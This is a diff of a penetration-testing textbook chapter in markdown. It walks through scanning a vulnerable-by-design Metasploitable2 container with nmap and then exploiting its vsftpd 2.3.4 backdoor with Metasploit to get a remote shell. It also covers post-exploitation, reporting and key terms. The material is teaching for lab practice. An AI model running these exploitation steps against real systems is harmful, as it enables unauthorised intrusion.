+Take the example of the Vsftpd service running version 2.3.4 in the scenario provided in the previous section where a remote code execution exploit was listed on ExploitDB.  This service is absolutely discoverable by a tester and would be exploited to gain initial access.  To avoid this type of exploitation, it is important for defenders and administrators to ensure a strong patch management process while limiting the attack surface of exposed systems.
 
 >[!activity] Activity 10.4 - Metasploitable2
 >So far in this chapter we have explored Metasploit, reverse shells, and the testing process.  These skills can be practiced on the vulnerable by design Metasploitable2 docker image.  This image has many services and a web application which has many vulnerabilities.  The goal of the system is to practice identifying and exploiting vulnerabilities and will make as a great proxy to perform a mock penetration test against.
@@ -393,53 +396,53 @@ Most services are reasonably secure and only allow for the functionality of the 
 >```bash
 >sudo nmap -sT -sV 172.17.0.2
 >```
->![[../images/10/pentest_activity_services.png|NMAP Service Scan On Metasploitable|600]]
+>![[../images/10/pentest_activity_services.png|NMAP Service Scan On Metasploitable|500]]
 >There are many potential targets to further enumerate.  The first one that catches my eye is port 21 Vsftpd version 2.3.4.  You may recall that this software version was explored on ExploitDB and could contain a remote code execution Metasploit exploit.  I start Metasploit to begin my exploitation phase of the penetration test.
 >```bash
 >sudo msfdb run
 >```
->![[../images/10/pentest_activity_metasploit_start.png|Starting Metasploit on Kali|600]]
+>![[../images/10/pentest_activity_metasploit_start.png|Starting Metasploit on Kali|500]]
 >Once Metasploit starts, I search for useful modules related to Vsftpd.
 >```bash
 >search vsftpd
 >```
->![[../images/10/pentest_activity_search.png|Searching Vsftpd Modules In Metasploit|600]]
+>![[../images/10/pentest_activity_search.png|Searching Vsftpd Modules In Metasploit|500]]
 >The second module looks promising as it has an excellent rank and suggests it is a remote command execution module for Vsftpd 2.3.4.  I select the module with the `use` command then display the options related to the it.
 >```bash
 >use exploit/unix/ftp/vstfpd_234_backdoor
 >```
->![[../images/10/pentest_activity_use_exploit.png|Select Exploit and Display Configuration Options|600]]
+>![[../images/10/pentest_activity_use_exploit.png|Select Exploit and Display Configuration Options|500]]
 >Looks like I need to set RHOSTS as it is required.  I could change the payload, but the default one should work well.  I set RHOSTS to the target IP 172.17.0.2 and then run the exploit.
 >```
 >set RHOSTS 172.17.0.2
 >run
 >```
->![[../images/10/pentest_activity_exploit.png|Running Exploit Against Target|600]]
+>![[../images/10/pentest_activity_exploit.png|Running Exploit Against Target|500]]
 >Almost immediately, I receive positive log messages and then about 30 seconds later, another output message suggests that command shell session 1 was opened.  Entering the sessions command reveals an active and open session related to the exploit.
 >>[!tip] Tip - Return to MSF
 >>If you are following along and MSF put you into the shell session automatically, you can return to Metasploit by running the `background` command.  This will put you back to the MSF command line where the `sessions` command can be run.
 >```
 >sessions
 >```
->![[../images/10/pentest_activity_session.png|Listing Metasploit Sessions|600]]
+>![[../images/10/pentest_activity_session.png|Listing Metasploit Sessions|500]]
 >The session listed was generated from the exploit.  It represents a connection my Kali host has to the Metasploitable victim container.  I jump into the session's terminal using the session command, but this time specifying the session ID 1.
 >```
 >sessions 1
 >```
->![[../images/10/pentest_activity_interactive_session.png|Entering Interactive Session 1|600]]
+>![[../images/10/pentest_activity_interactive_session.png|Entering Interactive Session 1|500]]
 >The interactive session is started and I am left with a blank command line.  I try the following commands that return standard output from the victim!  I now have a remote terminal on the victim from the Vsftpd exploit.
 >```bash
 >whoami
 >uname -a
 >ip a
 >```
->![[../images/10/pentest_activity_rce_terminal.png|Command Terminal On Victim|600]]
+>![[../images/10/pentest_activity_rce_terminal.png|Command Terminal On Victim|500]]
 >I can hop out of the interactive session and return to Metasploit with the `background` command while answering yes.  Afterwards, I can access the session again using the session command.
 >```
 >background
 >y
 >```
->![[../images/10/pentest_activity_background.png|Background Interactive Session]]
+>![[../images/10/pentest_activity_background.png|Background Interactive Session|500]]
 
 ### Post-Exploitation
 The tactics performed after initial access are called post exploitation and consist of persistence, pillaging, privilege escalation, and pivoting.  Persistence and privilege escalation tools and techniques were covered in more detail within the Persistence and Privilege Escalation chapter.  After persistence is established by the tester, they will perform pillage efforts to gather inside information from the compromised device.  The tester will perform system specific information gathering to learn as much as they can about the now compromised system.  This information may include the software that is installed on it, uses of the system, the processes, services and jobs running on it, and any other devices it might be connected to within the network.  Further pillaging efforts seek to collect credentials from the system's trust stores, security systems, applications, and browsers.
@@ -463,6 +466,52 @@ The next section of a professional report will include an executive summary in o
 The most important section of the report is the itemization of detailed findings.  Here, the tester will describe in technical details each security issue, vulnerability, and misconfiguration discovered.  It is a technical section meant for administrators and developers to reference during the remediation phase of the testing cycle.  Each finding should be separate from other findings and rated with a severity that is well supported.  Ideally these findings have industry references to CVEs, CWEs, OWASP and MITRE ATT&CK framework, as applicable.  The findings must state the asset where the issue was discovered, details to reproduce including commands and screenshots, and provide information on how to remediate the issue.
 
 I highly recommend navigating to Juliosarfort's GitHub repository public-pentesting-reports at https://github.com/juliocesarfort/public-pentesting-reports for exploring dozens of reports produced by various testing firms.  Within the repository, you will find sample reports that include the aforementioned sections along with other useful sections and formatting to use in your own reports.  Another awesome resource is TCM's Sample Pentest Report https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report.  It is a great template to build from if you have to write a report from scratch.
+## Summary
+This chapter provided a comprehensive overview of security testing methodologies, beginning with the legal and organizational frameworks that govern engagement letters and scope definitions, and moving through the spectrum of assessment types.  These types included compliance focused audits and automated vulnerability scans to hands-on penetration tests, bug bounty programs, and long-term red team exercises.  The chapter compared in-house versus third-party security testing approaches, outlined key scoping decisions (asset types, internal vs. external vantage points, authentication levels from black to white box), and emphasized the importance of allow-listing and clear objectives.  Then, the chapter introduced core testing toolsets, such as Metasploit, Covenant, Cobalt Strike, and other C2 frameworks.  Details were provided that described framework infrastructure layering, proxying, and “living off the land” techniques attackers use to maintain stealth.  Building on that, the chapter examined the phases of an engagement, including reconnaissance (passive and active), enumeration, exploitation (like phishing, RCE payloads, and reverse shells), and post-exploitation activities such as persistence, pillaging, privilege escalation, and pivoting.  Lastly, professional reporting practices that leverage standardized severity ratings and visualizations to guide remediation were explored.
+
+>[!terms] Key Terms
+>**Bug Bounty Programs** - Programs that offer financial incentives for independent security researchers to discover and responsibly disclose unique security issues in an organization’s systems and applications.
+>
+>**Command and Control (C2)** - A type of framework and server infrastructure that organizes and manages agents on compromised endpoints, allowing attackers to issue commands and receive data from multiple victims.
+>
+>**Command Line Interface (CLI)** - The prompt portion of a shell that starts with a blinking cursor and accepts text‐based commands to instruct the operating system or applications.
+>
+>**Console** - Historically, the physical device connected to a mainframe that users operated to interact with computing resources.
+>
+>**Enumeration** - The phase in which a tester conducts manual and automated scanning against identified targets to discover specific entry points or weaknesses.
+>
+>**Exploitation** - The phase where direct attacks are performed to leverage vulnerabilities or misconfigurations and achieve initial access to a target.
+>
+>**Framework** - A suite of integrated tools designed to identify, exploit, and manage compromised systems, often including modules for scanning, payload delivery, post-exploitation, and reporting.
+>
+>**Initial Access** - The first point of entry gained by a tester or attacker into a target network or system, from which further testing or malicious activity can proceed.
+>
+>**Password Spraying** - A technique that attempts a common password against many user accounts sequentially to avoid lockouts and increase the likelihood of a successful login.
+>
+>**Password Stuffing** - An attack method where credentials obtained from a prior data breach are tried against other systems or accounts to gain unauthorized access.
+>
+>**Penetration Testing** - A time-boxed engagement in which qualified security professionals manually and automatically evaluate systems, networks, or applications for known vulnerabilities and misconfigurations.
+>
+>**Post Exploitation** - The collection of activities performed after initial access, including establishing persistence, gathering credentials, escalating privileges, and pivoting to additional systems.
+>
+>**Purple Teaming** - A collaborative approach in which red (offensive) and blue (defensive) teams work together to test and improve an organization’s security posture in real-time.
+>
+>**Reconnaissance** - The information gathering phase where testers collect data about a target, either passively via public resources or actively by interacting with systems, to prepare for subsequent attacks.
+>
+>**Red Team** - A long-duration, adversary simulation exercise conducted by skilled professionals who use any attack method available to test an organization’s detection and response capabilities.
+>
+>**Reporting** - The final phase of a security engagement, culminating in a structured document that includes background, executive summary, and detailed findings with reproducible steps and remediation guidance.
+>
+>**Reverse Shell** - A connection method where a remote (victim) system initiates an outbound session to an attacker-controlled listener that provides an interactive shell.
+>
+>**Scope** - The defined boundaries of a security test, detailing which assets, systems, dates, and objectives are included under an engagement letter or agreement.
+>
+>**Shell** - A computer program that provides a text-only interface through which users can enter commands to run other programs.
+>
+>**Terminal** - The software or hardware interface (originally a terminal device) that presents a shell’s text-based interface to the user.
+>
+>**Vulnerability Assessment** - A third-party or in-house process that scans systems or networks using automated tools to identify common misconfigurations and known vulnerabilities without manual exploitation.
+
 ## Exercises
 
 >[!exercise] Exercise 10.1 - SSH
@@ -574,7 +623,9 @@ I highly recommend navigating to Juliosarfort's GitHub repository public-pentest
 >```bash
 >sudo usermod -aG docker $USER
 >```
->With your Kali VM rebooted, run the Metasploitable2 docker image as name "metasploitable2", which will cause it to download automatically and start the services. The "&" ampersand at the end of the command makes the command run in the background of the terminal. **Please allow about 15 minutes for the container to download, run, and start services.**
+>With your Kali VM rebooted, run the Metasploitable2 docker image as name "metasploitable2", which will cause it to download automatically and start the services. The "&" ampersand at the end of the command makes the command run in the background of the terminal. 
+>
+>**Please allow about 15 minutes for the container to download, run, and start services.**
 >```bash
 >docker run -it --name "metasploitable2" tleemcjr/metasploitable2 sh -c "bin/services.sh && bash" &
 >```
@@ -587,10 +638,11 @@ I highly recommend navigating to Juliosarfort's GitHub repository public-pentest
 >```bash
 >ip a
 >```
->Perform a ping sweep to discover all hosts running on the docker0 network. Make sure to replace the network CIDR range if yours is different. Within a few seconds the ping sweep discovers a host on 172.17.0.2 (yours may be different). Once the host is discovered, press `CTRL+C` to stop the scan. Otherwise, you will have to wait several minutes for the scan to complete this /16 network.
+>Perform a ping sweep to discover all hosts running on the docker0 network. Make sure to replace the network CIDR range if yours is different. Within a few seconds the ping sweep discovers a host on 172.17.0.2 (yours may be different). 
 >```bash
 >sudo nmap -sn 172.17.0.1/16
 >```
+>Once the host is discovered, press `CTRL+C` to stop the scan. Otherwise, you will have to wait several minutes for the scan to complete this /16 network.
 >#### Step 3 - Service Discovery
 >Perform a TCP port and service scan against the identified target. Make sure to replace the IP with the identified metasploitable2 container IP discovered in the previous sub-step. Allow a few minutes for the scan to complete.
 >```bash
